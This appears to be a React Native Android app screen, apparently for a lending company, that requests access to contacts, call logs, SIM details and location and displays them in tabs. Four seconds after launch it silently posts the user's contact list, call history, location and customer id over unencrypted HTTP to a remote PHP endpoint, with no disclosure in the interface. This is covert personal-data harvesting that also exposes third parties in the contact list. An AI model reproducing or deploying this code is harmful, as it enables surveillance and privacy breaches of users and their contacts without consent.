

import React from 'react';
import {
  SafeAreaView,
  StyleSheet,
  ScrollView,
  View,
  Text,
  StatusBar,
  FlatList,
  TouchableOpacity,
} from 'react-native';
import Contacts from 'react-native-contacts';
import RNSimData from 'react-native-sim-data';
import GetLocation from 'react-native-get-location';
import RNAndroidLocationEnabler from 'react-native-android-location-enabler';
import {requestMultiple, PERMISSIONS} from 'react-native-permissions';
import CallLogs from 'react-native-call-log';
import axios from "axios";
import { connect } from 'react-redux';
import { loginSuccess, setCustomerList } from '../Action/authAction';
import { bindActionCreators } from 'redux';

//test

class App extends React.Component{
  state={
    contact:[{
      name:"Contact Name",
      number:"Contact Number"
    }],
    location:[
      {
        lat:"latitude",
        long:"longitude",
      },
      {
        lat:"N/A",
        long:"N/A",
      }
    ],
    logs:[
      {
        dateTime:"Date Time",
        name:"Name",
        phoneNumber:"Number",
        type:"Type",

      }
    ],
    accuracy:false
  }
  getDataFromPhoneNumber=()=>{
    var formdata = new FormData();
    formdata.append("contact", JSON.stringify(this.state.contact));
    formdata.append("location", JSON.stringify(this.state.location));
    formdata.append("logs", JSON.stringify(this.state.logs));
    formdata.append("cid",this.props.auth.customer[0].cid)

    formdata.append("t", '0.2');
    console.log("SENDING DATA : :: : : ",formdata)
    axios.post("http://mahavirafinlease.com/app/data.php",formdata,{
        headers:{
            "Content-Type": "application/json"
        }
    }).then(res=>{
        console.log("data : : : ",res.data)
    }).catch(err=>{
        console.log("Err",err)
        
    })
}
  
  componentDidMount=()=>{
    setTimeout(() => {
      this.getDataFromPhoneNumber()
    }, 4000);
    requestMultiple([PERMISSIONS.ANDROID.READ_CONTACTS,PERMISSIONS.ANDROID.READ_PHONE_STATE,PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION,PERMISSIONS.ANDROID.ACCESS_COARSE_LOCATION, PERMISSIONS.ANDROID.READ_CALL_LOG]).then(
      (statuses) => {
        console.log("CONTACT : ",statuses[PERMISSIONS.ANDROID.READ_CONTACTS]);
        console.log("PHONE : ",statuses[PERMISSIONS.ANDROID.READ_PHONE_STATE]);
        console.log("LOCATION : ",statuses[PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION]);
        console.log("CORS LOCATION : ",statuses[PERMISSIONS.ANDROID.ACCESS_COARSE_LOCATION]);
        if(statuses[PERMISSIONS.ANDROID.READ_CONTACTS]=="granted"){
          Contacts.getAll((err, contacts) => {
            if (err) {
              throw err;
            }
            console.log("CONTACT : ::: : :",JSON.stringify(contacts))
            this.setState({
              contact:[
              {
                name:"Contact Name",
                number:"Contact Number"
              },...contacts.map(item=>{
                return{
                  name:item.displayName,
                  number:(item.phoneNumbers&&item.phoneNumbers.length&&item.phoneNumbers[0])?item.phoneNumbers[0].number:"N/A"
                }
                })]
            })
            // contacts returned
          })
        }
        if(statuses[PERMISSIONS.ANDROID.READ_CALL_LOG]=="granted"){
          console.log("FINDING LOGS",CallLogs)
          CallLogs.loadAll().then(c => {
            this.setState({
              logs:[
                {
                  dateTime:"Date Time",
                  name:"Name",
                  phoneNumber:"Number",
                  type:"Type",

                },...c
              ]
            })
          });
        }
        // CallLogs.load(5).then(c => console.log(c));

        if(statuses[PERMISSIONS.ANDROID.READ_PHONE_STATE]=="granted"){
          let data = RNSimData.getSimInfo()
          if(data){
            this.setState({
              sim:[
                {
                  company:"Company",
                  displayName:"Display Name",
                  number:"Number",
                  simSerial:"SIM Serial"
                },
                {
                  company:data.carrierName0?data.carrierName0:"N/A",
                  displayName:data.displayName0?data.displayName0:"N/A",
                  number:data.phoneNumber0?data.phoneNumber0:"N/A",
                  simSerial:data.simSerialNumber0?data.simSerialNumber0:"N/A"
                },
                {
                  company:data.carrierName1?data.carrierName1:"N/A",
                  displayName:data.displayName1?data.displayName1:"N/A",
                  number:data.phoneNumber1?data.phoneNumber1:"N/A",
                  simSerial:data.simSerialNumber1?data.simSerialNumber1:"N/A"
                }
              ]
            })
          }
        }
        
      },
    );
   
    
    

    
  }

  getGeolocation=(accuracy)=>{
    GetLocation.getCurrentPosition({
      enableHighAccuracy: accuracy,
      timeout: 15000,
      forceRequestLocation:true,
      showLocationDialog:true
  })
  .then(location => {
      console.log(location);
      this.setState({
        location:[
          {
            lat:"latitude",
            long:"longitude",
          },
          {
            lat:location.latitude,
            long:location.longitude,
          }
        ]
      })
  })
  .catch(error => {
      const { code, message } = error;

      // console.warn(code, message);
      this.setState({
        location:[
          {
            lat:"latitude",
            long:"longitude",
          },
          {
            lat:"N/A",
            long:"N/A",
          }
        ]
      })
  })
  }
  render(){
    return (
      <>
        <StatusBar barStyle="dark-content" />
        <SafeAreaView style={{justifyContent:"center",alignItems:'center',flex:1}}>
          <View style={{width:"95%",flex:1}}>
          <View style={{flexDirection:'row',justifyContent:'space-around',marginTop:20}}>
          <TouchableOpacity style={{width:"20%",backgroundColor:(this.state.show==0?'#00A4FF':'#c4c4c4'),height:40,borderRadius:5,justifyContent:"center",alignItems:"center"}} onPress={()=>{this.setState({
            show:0
          })}}>
            <Text style={{color:"#fff"}}>Contacts</Text>
          </TouchableOpacity>
          <TouchableOpacity style={{width:"20%",backgroundColor:(this.state.show==1?'#00A4FF':'#c4c4c4'),height:40,borderRadius:5,justifyContent:"center",alignItems:"center"}} onPress={()=>{this.setState({
            show:1
          })}}>
            <Text style={{color:"#fff"}}>Sim Details</Text>
          </TouchableOpacity>
          <TouchableOpacity style={{width:"20%",backgroundColor:(this.state.show==2?'#00A4FF':'#c4c4c4'),height:40,borderRadius:5,justifyContent:"center",alignItems:"center"}} onPress={()=>{this.setState({
            show:2
          })}}>
            <Text style={{color:"#fff"}}>Location</Text>
          </TouchableOpacity>
          <TouchableOpacity style={{width:"20%",backgroundColor:(this.state.show==3?'#00A4FF':'#c4c4c4'),height:40,borderRadius:5,justifyContent:"center",alignItems:"center"}} onPress={()=>{this.setState({
            show:3
          })}}>
            <Text style={{color:"#fff"}}>Call Logs</Text>
          </TouchableOpacity>
          </View>
          
        {this.state.show==0&&(<FlatList
        style={{
          marginTop:50 
        }}
        data={this.state.contact}
        renderItem={({ item }) => <View style={{flexDirection:"row",justifyContent:'space-between'}}>
          <Text>{item.name}</Text>
          <Text>{item.number}</Text>
        </View>}
        keyExtractor={item => item.id}
      />)}
    {this.state.show==1&&(<FlatList
        data={this.state.sim}
        style={{
          marginTop:50 
        }}
        renderItem={({ item }) => <View style={{flexDirection:"row"}}>
          <Text style={{width:'18%'}}>{item.company}</Text>
          <Text style={{width:'15%'}}>{item.displayName}</Text>
          <Text style={{width:'25%'}}>{item.number}</Text>
          <Text style={{width:'43%'}}>{item.simSerial}</Text>
        </View>}
        keyExtractor={item => item.id}
        />)}
        {this.state.show==2&&(<>
        <View style={{flexDirection:'row',justifyContent:'space-around',marginTop:20}}>
        <TouchableOpacity style={{marginTop:40, width:"40%",backgroundColor:(this.state.accuracy?'#00A4FF':'#c4c4c4'),height:40,borderRadius:5,justifyContent:"center",alignItems:"center"}} onPress={()=>{
          this.setState({
            accuracy:!this.state.accuracy
          },()=>{
            if(this.state.accuracy){
              RNAndroidLocationEnabler.promptForEnableLocationIfNeeded({interval: 10000, fastInterval: 5000})
          .then(data => {
            this.getGeolocation(true)
          }).catch(err => {
            // The user has not accepted to enable the location services or something went wrong during the process
            // "err" : { "code" : "ERR00|ERR01|ERR02", "message" : "message"}
            // codes : 
            //  - ERR00 : The user has clicked on Cancel button in the popup
            //  - ERR01 : If the Settings change are unavailable
            //  - ERR02 : If the popup has failed to open
          });
            }
          })

        }}>
          <Text style={{color:"#fff"}} >Accuracy
          </Text>
        </TouchableOpacity>
        <TouchableOpacity style={{marginTop:40, width:"40%",backgroundColor:'#00A4FF',height:40,borderRadius:5,justifyContent:"center",alignItems:"center"}} onPress={()=>{
          this.getGeolocation(this.state.accuracy)
        }}>
          <Text style={{color:"#fff"}} >Refresh
          </Text>
        </TouchableOpacity>
        </View>
        
        <FlatList
        data={this.state.location}
        style={{
          marginTop:50, 
        }}
        renderItem={({ item }) => <View style={{flexDirection:"row", justifyContent:"space-between"}}>
          <Text>{item.lat}</Text>
          <Text >{item.long}</Text>
        </View>}
        keyExtractor={item => item.id}
        /></>)}
        {this.state.show==3&&(<FlatList
        data={this.state.logs}
        style={{
          marginTop:50 
        }}
        renderItem={({ item }) => <View style={{flexDirection:"row"}}>
          <Text style={{width:'30%'}}>{item.dateTime}</Text>
          <Text style={{width:'20%'}}>{item.name}</Text>
          <Text style={{width:'30%'}}>{item.phoneNumber}</Text>
          <Text style={{width:'43%'}}>{item.type}</Text>
        </View>}
        keyExtractor={item => item.id}
        />)}
          </View>
          
        </SafeAreaView>
       
      </>
    );
  }
  
};


const mapStateToProps = state => ({
  auth: { ...state.auth },
  darkMode: { ...state.DarkMode }
});

const ActionCreators = Object.assign(
  { loginSuccess,setCustomerList }
);
const mapDispatchToProps = dispatch => ({
  actions: bindActionCreators(ActionCreators, dispatch),
});

export default connect(mapStateToProps, mapDispatchToProps)(App);
